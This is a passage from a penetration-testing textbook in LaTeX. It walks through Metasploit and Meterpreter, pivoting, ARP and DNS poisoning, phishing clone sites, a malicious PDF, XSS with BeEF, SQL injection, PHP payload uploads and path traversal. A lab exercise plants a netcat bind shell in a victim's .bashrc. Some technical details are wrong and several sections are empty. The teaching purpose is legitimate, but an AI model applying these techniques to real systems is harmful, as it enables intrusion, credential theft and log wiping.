		Thus, before even touching Metasploit, you must know the target system well and have a plan of what you will attempt to exploit on it. 
		
		\subsection{MSFconsole}
			MSFconsole is the tool that you will interact with when using Metasploit. 
			This is the command line which you can interactively craft your attack. 
			However, it will also allow you to manage a number of attacks and target machines. 

			MSFconsole has a number of commands which can be used. 
			The following is a list of the most useful commands:
			\begin{description}
				\item[cd] Change working directory. 
					Exactly the same as the Unix command. 
				\item[connect] Communicate with a host. 
					This is similar to using netcat. 
				\item[edit] Edit the current module with the current \$EDITOR. 
				\item[exit] End the MSFconsole session. 
				\item[get] Get the value of a variable within this context. 
				\item[grep] Search the output of another command. 
					Exactly the same as the Unix command. 
				\item[help] Shows the explanations for most commands. 
				\item[info] Shows information about one or more modules. 
				\item[irb] Allows in place ruby scripting. 
				\item[jobs] Shows and allows management of running jobs.
				\item[kill] Kills a running job.
				\item[load] Load a given plugin. 
					Arguments are passed as ``key=value''. 
				\item[makerc] Save the commands you have entered thus far into a script. 
				\item[resource] Runs the commands saved in a file. 
					This file is usually created with the above ``makerc'' command. 
				\item[route] Route traffic through a session. 
				\item[save] Saves the active datastore. 
					This should allow you to return to the current session later. 
				\item[search] Search for a module with the given name or description. 
				\item[sessions] Show the current session listing and an information page on them. 
				\item[set] Sets a variable for the current exploit or payload. 
				\item[setg] Sets a global variable. 
				\item[show] Show modules of a given type or all. 
					A common usage is ``show options'' when setting up an attack. 
				\item[spool] Like a redirect in bash, but writes output to both a file and the screen. 
				\item[unset] Deletes the contents of a variable. 
				\item[use] Selects a module to use by name. 
			\end{description}
			\subsection{Exploits}
				Exploits are chosen based on the output of the Nmap and Nessus. 
				You should choose the exploit which suits the vulnerability which you found within these scans. 
				Not doing so will cause a large amount of excess network traffic and likely get you found. 

				The commands above will allow you to search the list of exploits, and use them. 
				However, it should be noted that the exploit that you choose will give you a number of new options. 
				The commands below will give you more information or tell you whether the exploit is likely to work. 
				\begin{description}
					\item[check]
						Determine Whether a target is vulnerable. 
					\item[exploit] Launch the attack. 
					\item[show targets] Shows the targets which will be vulnerable to this attack.
					\item[show payloads] Shows the payloads which are compatible with this exploit. 
					\item[show options] Shows the options which must be set to execute this exploit. 
					\item[show advanced] Shows the advanced options for the exploit. 
						These will likely not be useful unless you have very specific requirements. 
					\item[show evasion] Shows options used to attempt to avoid detection.
				\end{description}
			\subsection{Payloads}
				The payload is the code which is sent to be executed on the remote machine. 
				It is designed to get you a foothold, or perform a specific task on the machine.
				This code is usually quite small so as to aid transmission to the target. 
				This is usually either shellcode, or the program that you have sent for the shellcode to execute. 

				Payloads come in a number of types:
				\begin{description}
					\item[Inline]
						This is a single payload containing both the exploit and the shellcode for a task. 
						These are more stable, but far larger than other types of payload due to the fact that they must contain everything in the initial payload. 
					\item[Staged]
						This is a multi phase payload which works with a stager which receives the rest of the payload as it is needed. 
						This allows for smaller initial exploits, but requires a constant connection between the attacker and target. 
						This means that while it is easier to fit into an exploit, it can be far less reliable. 
					\item[Meterpreter]
						This is a meta-interpreter which allows for high level interaction with the OS. 
						It resides completely in memory, and has a number of scripts and plugins which can be used to better attack the target. 
					\item[PassiveX]
						This is useful for circumventing restrictive out bound firewalls. 
						It is based on ActiveX, creating a hidden IE instance and communicating over HTTP. 
					\item[NoNX]
						These are payloads designed to prevent NX bit implementations from stopping the payload. 
						For example, this would work to prevent DEP from stopping a payload on Windows. 
					\item[IPv6]
						These are payloads which may fit into another category but are designed to work over IPv6. 
					\item[Reflective DLL Injection]
						This is a technique where a staged payload is injected into the compromised host in memory. 
						It is designed to be difficult to detect by ensuring that it doesn't touch the filesystem.\footnote{\url{http://blog.harmonysecurity.com/2008/10/new-paper-reflective-dll-injection.html}}
				\end{description}
				
				When using a payload, it may be necessary to manipulate it for the target system. 
				This can be done in Metasploit with the ``generate'' command. 
				This command will create a hex encoded string which contains the shellcode ready to be input into an exploit. 
				However, this string will likely either contain bad characters or not be the correct encoding. 
				Thus, the generate command comes with a number of flags which allow you to set these values. 
				For example, the ``-b'' flag will tell the command to attempt to remove all characters which come after it. 
				Another example of this is the ``-e'' flag, which alongside the ``show encoders'' command will allow you to set the encoder which will be used to write the payload. 
				Finally, the ``-f'' flag can be used to give a file to write the payload to. 
		
			\subsection{Databases}
				Metasploit is also backed with a Postgresql database. 
				This database stores the information that you derive from your scans and attacks, allowing you to pull it back up in a timely manner. 
				Furthermore, the database is split into workspaces, which can be managed with the ``workspace'' command. 
				This allows one to create a store of information about a target or targets which persists over sessions. 

				When interacting with the database, specific commands must be used. 
				Rather than using the normal tools such as nmap, one should use the database patched ``db\_'' versions instead. 
				These will run in the same manner, but will also store their output in the database for future reference. 
				If the scan was done previously, or outside of the MSFconsole, one can import the XML file generated using ``db\_import''. 

				At this point, the ``hosts'' command will give an output of the hosts and their OS and network fingerprint. 
				It can further be used with it's flags in order to pull more information out of the database. 
				Similarly, the ``services'' command will allow you to pull available services out of the database. 
				Finally, collected hashes and other similar information con be retrieved using the ``loot'' command. 
	
			\subsection{Meterpreter}
				Meterpreter provides an environment which gives you powerful access to the target computer. 
				It will give you access to both the host itself, but also network and file transfers, allowing you to retrieve data from the computer and plant other exploits. 
				While most normal Unix commands work, what follows is a list of Metrepreter specific commands:
				\begin{description}
					\item[background]
						Return to the MSFconsole. 
						You can get back to Meterpreter using the sessions command. 
					\item[clearev]
						Clear the Application, System and Security logs of a windows system. 
					\item[download] 
						Takes a file from the remote machine to the attackers. 
						Note: Use double slashes when working with windows paths. 
					\item[edit] 
						Open the Vim editor on the given file. 
					\item[execute]
						Runs the given command on the target machine. 
					\item[getuid]
						Get the user ID and name that the Meterpreter session is running as. 
					\item[hashdump]
						Write the contents of the SAM database to screen. 
					\item[idletime]
						Prints the time that the user of the target machine has been idle. 
					\item[lpwd and lcd]
						These commands will print or change the attacking machines directory. 
					\item[migrade]
						Move to another process on the victim machine. 
					\item[resource]
						Execute a script written for Meterpreter found in the given file. 
					\item[search]
						Find a specific file on the target machine. 
					\item[shell]
						Run a native shell on the target machine. 
					\item[upload]
						The exact reverse of the download command. 
					\item[webcam\_snap]
						This, along with ``webcam\_list'' will take a photo using the webcam attached to the computer. 
				\end{description}
				It is worth noting that Meterpreter can be extended by writing a python script and executing or importing it using ``python\_execute'' or ``python\_import'' respectively. 
			% For Basic Metasploit this is as far as we go. 
			% We could get far further into exploit development and other advanced topics, but it is beyond the scope of this. 
	\section{Pivoting}
		Pivoting is the act of using a machine that you have gained access to as a means to penetrate further into the network. 
		This allows an attacker to avoid having to bypass the external firewall again while also giving access to internal DNS amongst other local networks. 
		Thus, pivoting is a fundamental aspect of penetration testing, allowing for a vastly higher level of access than would be available without it. 
		This section assumes that you have successfully broken into the target machine and have a Meterpreter session running on it. 
	
		In order to pivot, we will use the Meterpreter command ``portfwd''.
		This command sets up a TCP forwarding rule on the machine, allowing you to interact with the local network as if you were working from the machine itself. 
		The options for ``portfwd'' can be found in table \ref{tab:portfwdFlags}.
		\begin{table}[htb]
			\centering
				\begin{adjustbox}{max width=1\textwidth}
			\begin{tabular}{| l | l |}
				\hline
				-L & The listening host. Omitted unless listening on a specific adaptor.\\ \hline
				-l & The local port to listen on. Connections here will be forwarded. \\ \hline
				-p & TCP port to forward connections to. \\ \hline
				-r & The IP address the connection is relayed to. \\ \hline
				Add & Create a forwarding rule. \\ \hline
				Delete & Remove a forwarding rule. \\ \hline
				List & List all forwarding ports. \\ \hline
				Flush & Delete all rules. \\ \hline
			\end{tabular}
		\end{adjustbox}
			\caption{Portfwd Flags}
			\label{tab:portfwdFlags}
		\end{table}
		This should be done after scanning the internal network and choosing a target. 
		This is due to the fact that you will have to know the port and how you will attack it well before setting up the forwarding rule. 
		By utilizing this alongside hash captures and system access one can quickly and easily control most machines within a corporate network. 
		This makes pivoting an exceptionally useful tool for anyone attempting to gain access into computer systems. 

	\section{ARP Attacks}
		ARP, or the Address Resolution Protocol resides on layer three of the OSI Model. 
		This protocol is used to translate layer 3 IP addresses into layer 2 MAC addresses using a table stored within the switch. 
		This table must be updated when new devices enter the network, as well as when they leave. 
		Thus, ARP tables have a set timeout, causing the data to be removed after that time. 
		ARP attacks use this table as a means to gain access to traffic that was not destined for them. 

		ARP poisoning is the sending of unsolicited and forged ARP messages. 
		These will usually contain the IP address of a network resource such as the default gateway or a local server. 
		This means that all traffic sent to that gateway will be transmitted through the poisoning machine. 
		This is due to the fact that network devices are designed to overwrite the old data within their ARP tables with new entries. 
		Thus, any ARP packet sent could result in the destination computer being poisoned. 

		At this point, the attacker is now a man in the middle, able to perform any action they desire on the data being sent to or from the machine. 
		For example, this could be used to insert BeEF hooks (See chapter /ref{ch:WebPenetration}) into an insecure page or to DoS attack the system by dropping all to the network resource targeted. 

		The main tool used for this attack is ``Ettercap''. 
		This tool provides a suite of tools for ``Man in the Middle'' (MitM) attacks. 
		Furthermore, it will filter content on the fly, giving you only useful data. 

		The following is a short guide to using Ettercap for ARP poisoning. 
		\begin{enumerate}
			\item Open Ettercap and ensure  it is set to promiscuous mode under options. 
			\item From the Sniff menu, select ``Unified Sniffing''. 
			\item Select the NIC attached to the network you wish to attack. 
			\item Under hosts, select scan for hosts. 
			\item View the hosts list and choose your targets. 
			\item Ensure that sniffing has started by selecting Start -> Start Sniffing. 
			\item All data sent between the targets will be intercepted and filtered. 
				You will be shown relevant data. 
		\end{enumerate}
		This however, is just the start of a useful session with Ettercap. 
		Once you have found a session, you can insert data to be sent. 
		On a simple level, this could be done do an admin using a telnet session to inform them that you have gotten access or to run commands on their server. 
		However, you could also use this to insert a script into a page they are downloading, hooking them with BeEF and gaining access to their computer. 

		Thus, Ettercap and ARP poisoning are exceptionally useful tools within a switched network, 
		giving you the power to run MitM attacks and capture any traffic. 
		However, there are some constraints:
		\begin{itemize}
			\item While this attack will pick up encrypted traffic, it will not be able to read it. 
				Further work would have to occur before you would be able to capture the transmitted keys. 
			\item This will not work on a network that is not switched. 
			\item While these attacks are hard to find, many of the uses of them will be immediately obvious. 
				Inserting a message into a telnet session is a good example of this. 
			\item This type of attack can be found in the ARP poisoning stage by numerous tools such as 
				AntiARP (Windows), ARPStar (Linux) or Dynamic ARP Inspection (Cisco Switches)
		\end{itemize}
	\section{DNS Attacks}
		DNS, as you saw in Chapter \ref{ch:NetworkOperations} is the backbone of the Internet. 
		Without it, most of what we know on the Internet would be quite dead as the machines would have no way of updating addresses and humans would have no remember ever changing IP addresses. 
		However, DNS is also the Holy Grail of server enumeration and Man-in-the-Middle (MitM).
		This is because it contains the information that maps Domain names to the IP addresses needed to communicate with them. 

		This section will first discuss the act of DNS enumeration through either zone transfer or brute force. 
		It will then explain the process of DNS poisoning in order to conduct a MitM attack. 

		\subsection{DNS enumeration}
			DNS enumeration gives you access to some or all of the data stored on the DNS server or cache. 
			This means that you will have a listing of all computers within the DNS zone: your list of targets. 
			There are two ways of doing this, the easy way and the hard way. 
			The former requires that the server that you are targeting was misconfigured, leaving it open to zone transfer. 
			The latter must be done using brute force DNS enumeration, which can take numerous hours. 

			\subsubsection{DNS Zone Transfer}
				DNS zone transfer is the act of gaining access to the internal DNS servers of an organisation. 
				It's original use was to allow a slave name server to request a master copy of a particular zone's information from the master server. 
				However, this can be subverted to get the server to enumerate the whole network to anyone if it is misconfigured. 
				There are a number of name servers\footnote{\url{https://digi.ninja/projects/zonetransferme.php}} which are vulnerable to this. 
				An example of such a zone transfer can be found by running the following command. 
				\begin{lstlisting}[style=CLI]
					$ dig axfr @nsztm1.digi.ninja zonetransfer.me
				\end{lstlisting}
				The output of this command is left as an exercise for the reader as the output would take multiple pages within this book. 
				However, this will output all relevant data about the domain that you are targeting. 
				This is because while you are accessing the name server from outside it's internal zone, you are also transfering into it. 
				Thus, you will receive all information from within this internal zone. 

				On a normal business system, this could be information such as mail servers, VPN hosts or web servers. 
				However, on particularly bad systems, you will get a list of all hosts connected to the network, allowing you to target any machine within it. 

				Furthermore, the names of these systems give you more information for your attack. 
				If you come across an office or other branch like setup within the network, it is likely that this will come with a location (or that the location could be found through DoXXing, see Chapter \ref{ch:Forensics}). 
				Using this, and looking up time zones and business hours, you could target this system while no one is looking, 
				giving you a far better shot of getting in without being noticed. 
			%TODO: Finish zone transfer and this section.

		\subsection{DNS Poisoning}
			DNS poisoning, similar to ARP Poisoning, is the act of telling other computers on the network that you are someone you aren't in order to gain further access to a system. 
			There are two ways of doing this:
			\begin{enumerate}
				\item Request Interception.
				\item Cache Poisoning. 
			\end{enumerate}
			The former works by using ARP poisoning to steal the requests then responding to them with fake answers. 
			The latter works after gaining access to an authoritative DNS server or cache. 

			\subsubsection{DNS Poisoning Through ARP}
				As explained in the above section on ARP Poisoning, ettercap should be setup to redirect traffic from the target machine bound for the name servers to itself. 
				You will then need to alter the file found at ``/usr/share/ettercap/etter.dns'' with the data of the names and IP addresses that you would like to poison. 
				An example of this configuration can be seen below:
				\lstinputlisting[numbers=none]{./shellOut/etter.dns}
				You must then enable the ``dns\_spoof'' plugin. 

				Once this has been setup, all DNS queries sent from the target machine will be intercepted and poisoned. 
				This can be tested by attempting to resolve the poisoned name from the target machine. 
				You may then go on with the attacks explained in social engineering to steal passwords or attack computers. 
			\subsubsection{DNS Poisoning Through Server Attacks}
				The alternative to setting up ARP Poisoning is to attack the server itself. 
				This section assumes that you have both successfully exploited the name server and found it's configuration. 
				It also assumes that the name server is running bind9 on a UNIX-like system. 

				Within the ``options'' section of the servers configuration, there should be a line starting with ``directory''. 
				This line designates where the servers DNS cache is stored. 
				Navigate to the cache directory and edit the files within to set them to your specifications. 
				An example configuration can be seen below:
				\lstinputlisting[numbers=none]{./shellOut/bind.conf}
	\section{Social Engineering}
		Accessing a computer network need not always be done through targeted attacks on vulnerable software. 
		Often, targeting the wetware through the far too common PEBKAC error is more fruitful. 
		Thus, the following sections discuss the different ways of convincing the user to tell you information that they shouldn't. 
		Sometimes, this will give you direct access to their computer, or that of another part of the organization. 
		However, it is more than likely that with a large enough spread, you will at least catch one users password being sent to the wrong service. 

		\subsection{Fake Websites}
			Fake websites are one of the easiest social engineering attacks available.
			This is especially so when you have already set up DNS poisoning as shown in the above section. 

			Such an attack will allow you to serve a page that looks exactly like the one the user is requesting, but will retain their password for you before sending it off to the legitimate service. 
			With little effort, this can be done on any site. 
			However, it takes significantly more to make the site have the correct TLS certificates and encryption. 
			
			The tool used to conduct such an attack is ``weeman''. 
			This tool allows you to scrape a web page from the Internet and serve it from your own machine, capturing any information transmitted to it. 

			To start weeman, run the command ``weeman <site to scrape>''. 
			This will scrape the site and start a server serving it. 
			It will also begin reading POST requests, looking for passwords and other information. 

			If you have set this up correctly, browsing to ``localhost'' should show you the fake website. 
			However, on the targeted machines, browsing to the name of the site you have scraped should send you to weemans fake version. 

			At this point, weeman should output any usernames or passwords that are sent to it, redirecting those users to the correct site. 
			\subsubsection{Weeman with TLS}
		\subsection{Email}
		\subsection{Social Engineering Toolkit}
		\subsection{Malicious PDF}
			This section will discuss the creation of a client side exploit, stored in a PDF, through the use of Metasploit\footnote{\url{https://www.offensive-security.com/metasploit-unleashed/client-side-exploits/}}.
			This is usually used for targeted social engineering attacks, where you know a significant amount about the user in order to ensure they will open the file\cite{MSFU} 

			This attack will be completed through the Metasploit Framework, and find an exploit which will work. 
			For demonstration here, the Adobe Reader ``util.printf()'' vulnerability will be used. 
			However, you should target your attack to what you know of the system. 

			Using this exploit, you will need to set a number of options within Metasploit, such as the file name, payload and connection options. 
			Once this has been set, the run command will give you the PDF ready to be sent to the target. 

			To properly stage the payload, you will then need to set up a listener. 
			This should be done using the ``exploit/multi/handler'' exploit and an appropriate payload. 
			Once this is running, you should send the PDF to the machine that you are targeting. 

			On opening the PDF, a connection should be made between the Metasploit handler and the PDF, giving you Meterpreter access to the machine. 
			From here, you can migrate to another process and use the machine as your own. 
	\section{Challenges}
	% TODO: https://www.vulnhub.com/
	% 
	\subsection{Unsecured DNS Server}
		The DNS server at ``ns.cysec'' has a number of known vulnerabilities in it. 
		It is running a version of bind that is no longer supported. 
		Target it first using the ``version'' command in a DNS query. 
		This will give you the information that you will require to search for a vulnerability in it and gain access to the system. 

		\subsubsection{DNS Poisoning}
			
		\subsection{DNS Zone Transfer}

		\subsection{Unsecured FTP to Shell}
		% Expect tutorial for setting this up. http://web.archive.org/web/20041010121409/http://www.raycosoft.com/rayco/support/expect_tutor.html
			This section is an initial walk through for getting access to a system with an unsecured FTP server. 
			This will use a number of tools which are covered in other sections, but is designed as an introduction. 
			Thus, if you have not used these tools before, do not worry, they will be explained later. 

			To do this, the first step is to determine what the computer you are targeting is running. 
			This is done using the tool ``nmap'' as below:
			\begin{lstlisting}[style=CLI]
				$ nmap -Sv <Target> -p-
			\end{lstlisting}
			This will give us a list of the services which are running on the server, as well as their names and ports. 
			We will be looking at the FTP server, as it is currently allowing plain text authentication:
			\begin{quote}
				21/tcp    open  ftp         vsftpd 2.3.4
			\end{quote}
			Unlike SFTP, the modern protocol, FTP often allows for plain text authentication, meaning that a person intercepting traffic would be able to read the user name and password. 
			This is how we will begin to gain access to the system. 

			Open the program Wireshark and start a listener on eth1. 
			This is the NIC that is connected to the remote server and that someone may be interacting with it on. 
			Usually this would be done through means such as a \href{https://lanturtle.com/}{LAN Turtle}, 
			However, for the purposes of this demonstration, we will simply be using a local network interface. 

			When the listener is setup, look for a set of TCP and FTP packets to the target from your machine. 
			These will likely be the FTP authentication, so right click and select ``Follow TCP Stream'' to view the messages that were sent. 
			At this point you should have the user name and password. 
			If you do not, find another set of TCP and FTP messages and try again. 
			For more information on using Wireshark, see it's section in Chapter \ref{ch:Forensics}.

			Now that we can alter files on their system, add the following line to their .bashrc.
			This will open a listener on port 5005 which can be interacted with from any computer on the network. 
			\begin{lstlisting}[style=CLI]
				$ nc -l -k -p 5005 -e /bin/bash
			\end{lstlisting}

			Using FTP with the user name and password that you found, run the following commands:
			\begin{verse}
				get .bashrc 
			\end{verse}
			Exit FTP at this point and edit the required line into the .bashrc then run the following FTP command:
			\begin{quote}
				put .bashrc
			\end{quote}
			This will mean that as soon as the msfadmin user logs into their account, a shell will be opened on port 5005. 

			At this point, we can get shell access to the computer using the following command:
			\begin{lstlisting}[style=CLI]
				$ ncat <target IP> 5005
			\end{lstlisting}
			While you will not see it, this will give you access to a shell, but no prompt. 
			Try any shell command that you know, most will work. 
			
			At this point, navigate to the file at ``/etc/flag'' and tell me the flag that you find. 
			
\chapter{Web Penetration}
	\label{ch:WebPenetration}
	\section{XSS}
		XSS is one of the main attack vectors for modern viruses and attacks. 
		It is commonly used as the first access to the system, delivering a more stable connection to the system later. 
		XSS will allow you to gain preliminary access to the system, creating a vector for your control of it. 
		Furthermore, with a tool such a BeEF, you are able to control a significant amount of the victims computer purely through XSS. 
		XSS will allow you to inject malicious code into an otherwise trusted website, making it exceptionally powerful. 
		This occurs because a browser has no way to know that a script should not be trusted and thus will generally always run them. 
		This script can then access any cookies, session data or other sensitive data stored within the browser. 
		A good hook could even give access to the whole system. 
		XSS comes in two forms, reflected and stored. 
		We will be discussing both in depth. 
		\subsection{Reflected}
			This type of attack is easier to pull off but often easier to spot. 
			The attacker will send a link to a vulnerable website with a script within it. 
			The website will then echo back the script, having the users browser run it. 
			This script will then open a connection to another site, which will host the hook. 

			An example of this is the following URL:
			\begin{quote}
				https://example.com/page?var=<script>alert('xss')</script>
			\end{quote}

			The issue with this type of attack is that it requires that you can get the victim to click on the link.
			This is also the main reason it is recommended that you check links before clicking them.
		\subsection{Stored}
			Stored XSS works by finding a website that will retain your script for you and run it every time someone accesses the page. 
			Usually, these are found in comment or post boxes, but they can be anywhere that the user can input text which will be displayed for another user. 
			The benefit to these pages is that the link you send to them will not look dodgy and the script will hook anyone who attempts to access the page. 
		\subsection{BeEF}
			BeEF is the tool that makes this these attacks interesting. 	
			While previously, you could run arbitrary code on the remote computer, now you can run dynamic code. 
			The former is more powerful if you know how to write code, but BeEF will give you mostly the same outcome with far less work. 
			Similarly, like all good Linux tools, BeEF comes with both a CLI and GUI version. 
			We will be working with the GUI, as it does most of what we need to do. 
			However, the CLI version is significantly more powerful and adaptable. 
			
			The Default username and password for BeEF is beef:beef.
			\subsubsection{Hooking}
				Before you can do anything with BeEF, you will have to hook a browser. 
				To do this, you will first have to find a vulnerable page such as the guest book on DVWA. 
				At this point, you will want to embed the BeEF hook script into the page with a command such as the following:
				\lstinputlisting[numbers=none]{./shellOut/BeefHook.in}
				If you set this up correctly, the victim will have to do nothing more than access the page to be hooked. 
				No clicking or other intervention is required. 
			\subsubsection{Attacking}
				Once your hook is set, you should see an IP address under ``Online Browsers'' in the BeEF UI. 
				You can then select this IP for more information and attacks. 
				
				Under the details tab you will see the details of the browser and OS. 
				This can be useful for working out what attacks might work and determining what kind of user you are working with. 

				Under the commands tab, you will see a list of folders. 
				Each of these folders contains a number of commands which can be run on the remote computer. 
				\begin{description}
					\item[Browser] Information and attacks on the browser directly. 
						These can be used to get session cookies and other information. 
					\item[Chrome Extensions] Chrome specific attacks. 
					\item[Exploits] Direct browser or OS exploits. 
					\item[Host] Information gathering on the host machine. 
						This can be used to get items such as registry keys on a windows system. 
					\item[IPEC] Can be used to get shell access to the machine. 
					\item[Network] Network scanning and pivoting operations. 
					\item[Persistance] Retain access to the BeEF hook. 
					\item[Social Engineering] Attempt to convince the user that you are legit. 
						Gather user names and passwords for use on a specific site. 
				\end{description}

				Furthermore, BeEF can be connected to Metasploit to gain access to a Meterpreter shell. 
				This shell will give you persistence options as well as the ability to control the whole system. 
		\subsection{``AutoPWN''}
			The ``AutoPWN'' exploit in Metasploit allows you to automatically target a computer accessing a website. 
			As we have seen, using XSS, we can force a user to access a site of your choosing. 
			Through this, we can attack a browser, gain shell access to a machine and create a persistent back door automatically. 

			This module will detect the version of both the browser and any relevant plugins. 
			It will then launch any relevant attacks against that system. 

			To use the module, the following steps are necessary:
			\begin{enumerate}
				\item Set the HTMLContent option. 
					This will start the server with a page of your choosing. 
					You should specify this as ``file://<file>''.
					The site should be something simple, but not something that will tip off the user. 
				\item Set the ``EXCLUDE\_PATTERN'' and ``INCLUDE\_PATTERN'' to add or remove specific exploit types. 
				\item Set the ``MaxExploitCount'' to the number of exploits you would like to try. 
					More will give you more chance of getting in, but will be more obvious and likely to crash the browser. 
				\item Set the ``AllowedAddresses'' option to target only certain addresses with the attack. 
				\item Run the exploit. 
			\end{enumerate}

			Assuming that you have followed the steps above, place the ``BrowserAutoPwn URL'' given my Metasploit into your XSS and wait for a user to connect. 
		\subsection{Evading Anti-XSS}
		\subsection{Content Security Policy}
	\section{SQL Injection}
		SQL Injection (SQLi) is the process of escaping a normal SQL statement and entering your own SQL code into the query. 
		This allows you to have direct access to the database, giving you the ability to ensure it logs you in or to gather information about other accounts within it. 
		SQLi is a pertinent issue as the majority of websites use some form of SQL backing, which can be exploited to gather user data. 
		Furthermore, most sites that store credit card information also store these in the same database as the user data. 
		Without proper protection and standards compliance, it would be quite easy to gather this data for malicious purposes. 

		SQLi takes two main forms, normal and blind. 
		Both of these take a similar approach in code, but blind SQLi requires you to use other means to ensure that the code is being executed. 
		\subsubsection{Attack Types}
			There are a number of different types of SQLi attacks. 
			The simpler ones are described below:
			\begin{description}
				\item[OR 1=1] will ensure that the outcome of the SQL code will always be true. 
					When the code is run, the database will return all possible entries, rather than just the one that was expected. 
					This can be used to map the user accounts or other details stored within a database. 
				\item[; <statement>] This will end the current statement, which will likely end in an error then run <statement>.
					This means that you have arbitrary SQL execution on the database, allowing you to run any code. 
					Thus, you could print the whole database, or delete it. 
					This is a limitless approach. 
					You may want to end the new statement with ``;--'' which ends your statement and comments out any remaining code. 
				\item[UNION] This allows you to give a whole new select command to the database to be returned with your own. 
					Thus, you could use this to get a print out of the whole database within a filed that would only give you user names. 

			\end{description}
		\subsubsection{Attack Examples}
			
		\subsubsection{SQLmap}
			This tutorial assumes that you have already found a possibly vulnerable site or server which has either a database which has easy access or is receiving data through HTTP GET or POST commands. 
			You may not know that it is vulnerable, but the URL or other information about it makes you want to test it. 
			SQLmap will automate this process for you. 

			SQLmap will allow you to use the following techniques:
			\begin{description}
				\item[Boolean-Based Blind] This is where there is a difference between the page when the SQL is found to be true or false. 
					SQLmap will search the headers automatically, or the page for a regex string which will tell it it was successful. 
					With this, eventually SQLmap should be able to determine the output of the command. 
				\item[Time-Based Blind] SQLmap run a query which would put the database on hold for a given number of seconds. 
					By counting the time between running and returning, SQLmap can determine whether the command was run. 
					Further, using this the output can eventually be determined. 
				\item[Error-Based] This will force a specific error message to be presented. 
					This can be used to map what type of database is being run. 
					It will also report the output of the SQL statement, giving you insight into the data held within the database. 
				\item[Union Query Based] This will append a ``UNION ALL SELECT'' command to the current statement. 
					This causes the database to output everything requested in your select statement, allowing you to see all requested data. 
				\item[Stacked Queries] This mode will attempt to end the current command and append another to it using the ``;'' to end the current statement. 
					Like UNION, this can be used to map out all data stored within the database. 
					However, it can be used to run statements other than ``SELECT''. 
					It can further lead to filesystem manipulation and command execution. 
			\end{description}
			\paragraph{Direct Connection to a Database}
				This option (``-d'') will connect directly do a database which is running on the server. 
				This gives you significantly more power than connecting through an injectable web site, but it can only be done after you have found the credentials through other means. 
				SQLmap will accept a connection string in either of the following forms:
				\lstinputlisting[numbers=none]{./shellOut/SQLmapDBConnection.in}
				For example, the following command will output the DBMS banner, all databases and all DBMS users as well as fingerprinting the database. 
				\begin{lstlisting}[style=CLI]
					$ sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs --users
				\end{lstlisting}

			\paragraph{Web Based Attack}
				This is the more common attack, as it will work through a vulnerable form or request on a website. 
				For this case, you have to specify the URL as well as what you want from it. 
				An example of a command for this attack is as follows:
				\begin{lstlisting}[style=CLI]
					$ sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users
				\end{lstlisting}

				The syntax for this attack is much simpler, requiring only that you provide the URL and what you would like. 
				However, it can be extended upon by using the ``-l'' flag along with a burp suite log to attempt injection on all requests proxied through burp. 

			\paragraph{Other Attack types}
				These are less common, but useful means of attacking or scanning multiple sites. 
				\begin{description}
					\item[Sitemaps] Using the ``-m <URL>'' flag, you can have SQLmap scan a whole website. 
						This will report possible vulnerabilities based on that map. 
					\item[Textual Scan] Using the ``-m <FILE>'' flag will have SQLmap scan every URL within the file for the given data requests. 
					\item[HTTP Request] The ``-r <FILE>'' flag will load a raw HTTP request from the file and attempt to target it. 
						This means that you do not have to specify POSTs or cookies. 
					\item[Configuration] The ``-c <FILE> flag will load the configuration found within the file. 
						An example of this can be seen in ``sqlmap.conf''. 
					\item[Command Line Access] the ``--os-cmd'' or ``--os-shell'' commands will have SQLmap upload a library and gain shell access to the system. 
					\item[Meterpreter] the ``--os-pwn'' flag will attempt to upload and run the Metasploit shellcode. 
						This will return a Meterpreter shell which will give you access to many high level OS functions as well as the Meterpreter framework. 
				\end{description}
				More information on these attacks and other flags can be found at the \href{https://github.com/sqlmapproject/sqlmap/wiki}{SQLmap Wiki}
		\subsection{Character Encoding}
	\section{File Uploads}
		Allowing the user to upload a file to a webserver is one of the more dangerous features enabled on a number of systems. 
		These files will have to be stored somewhere accessible on the filesystem, as well as being one of the more common features. 

		Allowing file upload means that any user of a site can upload files, within given restrictions. 
		However, many of these restrictions can be altered, allowing for executable files to be uploaded to the server. 

		The following will step you through creating a PHP payload to upload to a server. 
		\begin{enumerate}
			\item Search for a php payload using the command ``msfvenom -l payloads | grep php''. 
			\item Create the file using the command ``msfvenom -p <payload> port=<port> > index.php''.
				You may also set any of the other variables that could be set from metasploit in the same way port is set.
			\item check that the code generated in ``index.php'' is correct. 
		\end{enumerate}

		Exploitation is now a simple matter of setting up a listener in metasploit using the ``exploits/multi/handler'' exploit, uploading the file and running it.

		More secure web sites will block the upload of certain types of content in order to stop these vulnerabilities. 
		The most basic form of this is based on file extension, allowing only ``.jpg'' extensions or some other set. 
		However, this is often blocked on the client side, rather than on the server. 
		Thus, by running traffic through a proxy such as burp suite, 
		one can edit traffic on the way out, setting the extension back to the preferred ``.php''. 
	\section{File Inclusion}
		File inclusion is common in PHP\footnote{\url{https://www.owasp.org/index.php/PHP\_File\_Inclusion}}
		However, it should never be exposed to the user, allowing them to submit a request for an arbitrary page. 
		It's main use is the execution of arbitrary code on the server, allowing for an easy way to gain access. 

		These vulnerabilities may allow for local or remote inclusion, giving the attacker the ability to either send a file over the network or use a file already placed on the system (though a previous file upload vulnerability). 
		These files can then be run using file inclusion, executing any code supplied by the attacker. 

		Generally, this would make use of tools such as MSFVenom, which will generate a PHP reverse shell payload to upload to the server. 
		The attacker would then set up a handler to listen for the returning shell, allowing the system to be exploited. 
		However, generic modules exist within metasploit to allow for automated file inclusion and payload 
		execition\footnote{\url{https://www.rapid7.com/db/modules/exploit/unix/webapp/php\_include}}.
		

	\section{HTTP Directory Traversal}
		Directory traversal is a basic attack on a poorly configured web server or application\footnote{\url{https://www.owasp.org/index.php/Path\_Traversal}}. 
		This works by asking the site for a page or file that is outside of the expected web directory. 
		Such requests can lead to signifficant information disclosure, and could also be a means of ingress if files such as ``/etc/shadow'' or a users ssh keys can be stolen. 

		The key to the attack is the use of the pointer directory within file systems. 
		This directory ``..'', points the user to the directory before the current. 
		However, when serving websites or file shares, it is a security risk to present the whole filesystem. 
		Thus, these systems use a ``web root'', which is usually ``/var/www/'' or ``/srv/www'' as the root directory. 

		By specifying a directory such as ``../../../../.../../.../../etc/passwd'' it is likely that the system will traverse back out of the web root and allow reading files in other directories. 
		However, may sites filter the `.' character in URLs. 
		To allow these sites to be traversed, the following codes may suffice:
		\begin{itemize}
			\item \%2e\%2e\%2f
			\item \%2e\%2e/
			\item \%2e\%2e\textbackslash
			\item \%cl\%lc for unicode
			\item \%c0\%af for unicode
		\end{itemize}

